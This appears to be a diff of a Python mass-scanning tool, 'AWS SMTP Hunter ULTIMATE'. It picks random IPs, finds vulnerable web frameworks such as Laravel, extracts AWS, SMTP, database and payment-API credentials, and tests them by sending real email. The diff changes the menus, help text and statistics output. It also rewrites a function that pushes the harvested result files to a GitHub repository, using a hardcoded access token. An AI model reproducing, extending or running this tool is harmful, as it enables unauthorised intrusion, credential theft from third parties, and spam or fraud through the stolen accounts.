@@ -2893,6 +2893,55 @@ You can use these credentials for email sending.
         print(f"   Total Runtime:      {elapsed/3600:.1f}h ({elapsed/60:.1f}min)")
         print(f"   Success Rate:       {self.stats.get('success_rate', 0)*100:.1f}%")
         
+        # Volume stats
+        print(f"\n📊 VOLUME STATISTICS:")
+        print(f"   IPs Generated:      {self.stats['generated']:,}")
+        print(f"   IPs Checked:        {self.stats['checked']:,}")
+        print(f"   IPs Valid:          {self.stats['valid']:,}")
+        print(f"   IPs Vulnerable:     {self.stats['vulnerable']:,}")
+        print(f"   IPs Exploited:      {self.stats['exploited']:,}")
+        print(f"   Efficiency:         {self.stats['valid']/max(1,self.stats['checked'])*100:.2f}%")
+        
+        # Exploitation summary
+        print(f"\n🔥 EXPLOITATION SUMMARY:")
+        print(f"   Laravel Sites:      {self.stats['laravel_found']:,}")
+        print(f"   AWS Credentials:    {self.stats['aws_working']:,} working / {self.stats['aws_found']:,} found")
+        print(f"   SMTP Credentials:   {self.stats['smtp_working']:,} working / {self.stats['smtp_found']:,} found")
+        print(f"   Database Access:    {self.stats['database_working']:,} working / {self.stats['database_found']:,} found")
+        print(f"   API Access:         {self.stats['api_working']:,} working / {self.stats['api_found']:,} found")
+        print(f"   Emails Sent:        {self.stats['emails_sent']:,}")
+        
+        # Service breakdown
+        if self.stats['aws_working'] > 0:
+            print(f"\n☁️ AWS SERVICES:")
+            print(f"   SES Ready:          {self.stats.get('aws_ses_ready', 0):,}")
+            print(f"   SMS Ready:          {self.stats.get('aws_sms_ready', 0):,}")
+            
+        if self.stats['database_working'] > 0:
+            print(f"\n🗄️ DATABASE ACCESS:")
+            print(f"   MySQL:              {self.stats.get('mysql_working', 0):,}")
+            print(f"   PostgreSQL:         {self.stats.get('postgresql_working', 0):,}")
+            
+        if self.stats['api_working'] > 0:
+            print(f"\n🔗 API ACCESS:")
+            print(f"   Twilio:             {self.stats.get('twilio_working', 0):,}")
+            print(f"   Stripe:             {self.stats.get('stripe_working', 0):,}")
+            print(f"   SendGrid:           {self.stats.get('sendgrid_working', 0):,}")
+            print(f"   Mailgun:            {self.stats.get('mailgun_working', 0):,}")
+            
+        # Files generated
+        print(f"\n📁 FILES GENERATED:")
+        total_size = 0
+        for file_key, filename in self.output_files.items():
+            try:
+                size = os.path.getsize(filename) if os.path.exists(filename) else 0
+                total_size += size
+                print(f"   {filename:35} {size:,} bytes")
+            except:
+                print(f"   {filename:35} Error")
+                
+        print(f"   {'TOTAL SIZE:':35} {total_size:,} bytes ({total_size/1024/1024:.1f} MB)")
+        
         print("="*120)
         print("🎯 SCAN COMPLETED - Thank you for using AWS SMTP Hunter ULTIMATE!")
         print("="*120)
@@ -2901,85 +2950,62 @@ You can use these credentials for email sending.
 # ==================== FONCTIONS UTILITAIRES ====================
 
 def push_results_to_github():
-    """🔁 Push automatique des résultats vers GitHub via API"""
+    """🔁 Push automatique des résultats vers GitHub"""
     try:
-        import requests
-        import base64
+        import subprocess
+        import shutil
         from datetime import datetime
         
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        output_folder = "."
+        repo_dir = f"/tmp/github_upload_{timestamp}"
         
-        # TON TOKEN
-        GITHUB_TOKEN = "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"
-        REPO_OWNER = "mehdi28777"
-        REPO_NAME = "data"
+        os.makedirs(repo_dir, exist_ok=True)
+        print(f"📁 Copying files to {repo_dir}")
         
-        headers = {
-            'Authorization': f'token {GITHUB_TOKEN}',
-            'Accept': 'application/vnd.github.v3+json',
-            'Content-Type': 'application/json'
-        }
+        files_copied = 0
+        for file in os.listdir(output_folder):
+            if file.endswith(".txt"):
+                shutil.copy(os.path.join(output_folder, file), os.path.join(repo_dir, file))
+                files_copied += 1
+                print(f"📄 Copied: {file}")
         
-        print("🚀 Uploading files to GitHub via API...")
-        
-        files_uploaded = 0
-        
-        # Lister tous les fichiers .txt
-        for filename in os.listdir("."):
-            if not filename.endswith(".txt"):
-                continue
-                
-            try:
-                # Lire le fichier
-                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
-                    content = f.read()
-                
-                # Encoder en base64
-                content_b64 = base64.b64encode(content.encode('utf-8')).decode('utf-8')
-                
-                # Préparer les données pour l'API
-                data = {
-                    'message': f'Upload {filename} - {timestamp}',
-                    'content': content_b64,
-                    'branch': 'main'
-                }
-                
-                # URL de l'API GitHub pour créer/modifier un fichier
-                api_url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{filename}'
-                
-                # Vérifier si le fichier existe déjà
-                check_response = requests.get(api_url, headers=headers)
-                if check_response.status_code == 200:
-                    # Fichier existe, récupérer le SHA pour la mise à jour
-                    existing_file = check_response.json()
-                    data['sha'] = existing_file['sha']
-                
-                # Créer ou mettre à jour le fichier
-                response = requests.put(api_url, headers=headers, json=data)
-                
-                if response.status_code in [200, 201]:
-                    print(f"✅ Uploaded: {filename}")
-                    files_uploaded += 1
-                else:
-                    print(f"❌ Failed to upload {filename}: {response.status_code}")
-                    print(f"Error: {response.text}")
-                    
-            except Exception as e:
-                print(f"❌ Error processing {filename}: {e}")
-                continue
-        
-        if files_uploaded > 0:
-            print(f"🎉 Successfully uploaded {files_uploaded} files to GitHub!")
-            print(f"🔗 Check: https://github.com/{REPO_OWNER}/{REPO_NAME}")
-            return True
-        else:
-            print("❌ No files were uploaded")
+        if files_copied == 0:
+            print("⚠️ No .txt files found to upload")
             return False
-            
+        
+        GITHUB_TOKEN = "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"
+        GITHUB_REPO = f"https://{GITHUB_TOKEN}@github.com/mehdi28777/data.git"
+        COMMIT_MESSAGE = f"Résultats scan {timestamp} - {files_copied} fichiers"
+        
+        print(f"🚀 Pushing {files_copied} files to GitHub...")
+        
+        os.chdir(repo_dir)
+        
+        commands = [
+            ["git", "init"],
+            ["git", "config", "user.name", "mehdi28777"],
+            ["git", "config", "user.email", "mehdi28777@github.com"],
+            ["git", "add", "."],
+            ["git", "commit", "-m", COMMIT_MESSAGE],
+            ["git", "branch", "-M", "main"],
+            ["git", "remote", "add", "origin", GITHUB_REPO],
+            ["git", "push", "--force", "-u", "origin", "main"]
+        ]
+        
+        for cmd in commands:
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            if result.returncode != 0:
+                print(f"❌ Error executing: {' '.join(cmd)}")
+                print(f"Error: {result.stderr}")
+                return False
+        
+        print(f"✅ Successfully pushed {files_copied} files to GitHub!")
+        shutil.rmtree(repo_dir, ignore_errors=True)
+        return True
+        
     except Exception as e:
-        print(f"❌ Error in GitHub API upload: {e}")
-        import traceback
-        traceback.print_exc()
+        print(f"❌ Error pushing to GitHub: {e}")
         return False
 
 def setup_signal_handlers(hunter):
@@ -3050,6 +3076,26 @@ def show_interactive_menu():
     print("   1. SMART    - Intelligent generation targeting productive ranges")
     print("   2. RANDOM   - Pure random generation for maximum coverage")
     print("   3. HYBRID   - 70% Smart + 30% Random (RECOMMENDED)")
+    print()
+    print("⚡ FEATURES INCLUDED:")
+    print("   • Async + Multi-threading for maximum performance")
+    print("   • Real-time framework detection (Laravel, Symfony, Django, etc.)")
+    print("   • Complete credential extraction and exploitation")
+    print("   • Live SMTP testing with real email sending")
+    print("   • AWS credentials testing with service quotas")
+    print("   • Database connection testing (MySQL, PostgreSQL)")
+    print("   • API testing (Twilio, Stripe, SendGrid, Mailgun)")
+    print("   • Intelligent learning and adaptation")
+    print("   • Advanced performance monitoring")
+    print("   • Automatic cleanup and optimization")
+    print("   • Comprehensive logging and reporting")
+    print()
+    print("🔧 PERFORMANCE OPTIMIZATIONS:")
+    print("   • Adaptive delays (0.01-0.1s)")
+    print("   • Intelligent queue management")
+    print("   • Memory optimization and cleanup")
+    print("   • CPU usage monitoring and adjustment")
+    print("   • Network optimization")
     print()
     
     while True:
@@ -3125,18 +3171,80 @@ def parse_command_line_arguments():
   python hunter.py                                    # Interactive mode
   python hunter.py --mode hybrid --threads 1000      # Quick start
   python hunter.py --mode smart --threads 2000 --email your@email.com --debug
+  
+🎯 MODES:
+  smart   : Intelligent targeting of productive IP ranges
+  random  : Pure random generation for maximum coverage  
+  hybrid  : Combination of smart + random (70/30 split)
+  
+⚡ PERFORMANCE:
+  • Recommended threads: 1000-2000 for optimal performance
+  • Higher thread counts require more system resources
+  • Async mode automatically enabled if aiohttp available
+  
+📧 FEATURES:
+  • Real-time SMTP testing with email sending
+  • AWS credentials validation with service analysis
+  • Database connection testing (MySQL, PostgreSQL)
+  • API testing (Twilio, Stripe, SendGrid, Mailgun)
+  • Framework detection (Laravel, Symfony, Django, etc.)
+  • Intelligent learning and performance adaptation
         """
     )
     
-    parser.add_argument('--mode', '-m', choices=['smart', 'random', 'hybrid'], help='IP generation mode')
-    parser.add_argument('--threads', '-t', type=int, help='Number of threads')
-    parser.add_argument('--email', '-e', type=str, help='Test email for SMTP validation')
-    parser.add_argument('--debug', '-d', action='store_true', help='Enable debug mode')
-    parser.add_argument('--output-dir', '-o', type=str, help='Output directory')
-    parser.add_argument('--config', type=str, help='Load configuration from JSON file')
-    parser.add_argument('--version', '-v', action='version', version='AWS SMTP Hunter ULTIMATE v5.0')
-    parser.add_argument('--quiet', '-q', action='store_true', help='Quiet mode')
-    parser.add_argument('--no-async', action='store_true', help='Disable async mode')
+    parser.add_argument(
+        '--mode', '-m',
+        choices=['smart', 'random', 'hybrid'],
+        help='IP generation mode (default: interactive)'
+    )
+    
+    parser.add_argument(
+        '--threads', '-t',
+        type=int,
+        help='Number of threads (default: auto-detect, max: 5000)'
+    )
+    
+    parser.add_argument(
+        '--email', '-e',
+        type=str,
+        help='Test email for SMTP validation (default: test@example.com)'
+    )
+    
+    parser.add_argument(
+        '--debug', '-d',
+        action='store_true',
+        help='Enable debug mode with verbose logging'
+    )
+    
+    parser.add_argument(
+        '--output-dir', '-o',
+        type=str,
+        help='Output directory for results (default: current directory)'
+    )
+    
+    parser.add_argument(
+        '--config',
+        type=str,
+        help='Load configuration from JSON file'
+    )
+    
+    parser.add_argument(
+        '--version', '-v',
+        action='version',
+        version='AWS SMTP Hunter ULTIMATE v5.0 - Complete Edition'
+    )
+    
+    parser.add_argument(
+        '--quiet', '-q',
+        action='store_true',
+        help='Quiet mode - minimal output'
+    )
+    
+    parser.add_argument(
+        '--no-async',
+        action='store_true',
+        help='Disable async mode (force sync only)'
+    )
     
     return parser.parse_args()
 
@@ -3160,15 +3268,21 @@ def validate_configuration(mode, threads, email, debug):
     """✅ Validation de la configuration"""
     errors = []
     
+    # Validation mode
     if mode not in ['smart', 'random', 'hybrid']:
         errors.append(f"Invalid mode: {mode}")
+        
+    # Validation threads
     if not 1 <= threads <= 5000:
         errors.append(f"Threads must be between 1 and 5000, got: {threads}")
+        
+    # Validation email
     if not email or '@' not in email:
         errors.append(f"Invalid email: {email}")
         
+    # Warning for high thread count
     if threads > 3000:
-        print(f"⚠️ WARNING: {threads} threads is very high")
+        print(f"⚠️ WARNING: {threads} threads is very high and may impact system performance")
         
     if errors:
         print("❌ Configuration errors:")
@@ -3193,6 +3307,7 @@ def main():
     
     # Configuration
     if args.config:
+        # Chargement depuis fichier
         config = load_configuration_file(args.config)
         if not config:
             sys.exit(1)
@@ -3201,11 +3316,13 @@ def main():
         email = config['email']
         debug = config['debug']
     elif args.mode and args.threads and args.email:
+        # Configuration via CLI
         mode = args.mode
         threads = args.threads
         email = args.email
         debug = args.debug
     else:
+        # Configuration interactive
         mode = show_interactive_menu()
         threads, email, debug = get_advanced_configuration()
     
@@ -3245,6 +3362,9 @@ def main():
         print(f"   Threads:           {threads}")
         print(f"   Test Email:        {email}")
         print(f"   Debug Mode:        {debug}")
+        print(f"   Async Available:   {AIOHTTP_AVAILABLE}")
+        print(f"   Output Directory:  {os.getcwd()}")
+        print(f"   Quiet Mode:        {args.quiet}")
     
     # Création du hunter
     try:
@@ -3261,6 +3381,10 @@ def main():
         # Confirmation finale si interactif
         if not args.mode and not args.quiet:
             print(f"\n🚀 READY TO START COMPLETE SCAN!")
+            print(f"   This will use {threads} threads for maximum performance")
+            print(f"   All credentials found will be tested and verified")
+            print(f"   Results will be saved in multiple output files")
+            print(f"   Real-time monitoring and adaptation enabled")
             input("\n🚀 Press Enter to start the complete scan...")
         
         # Lancement du scan complet
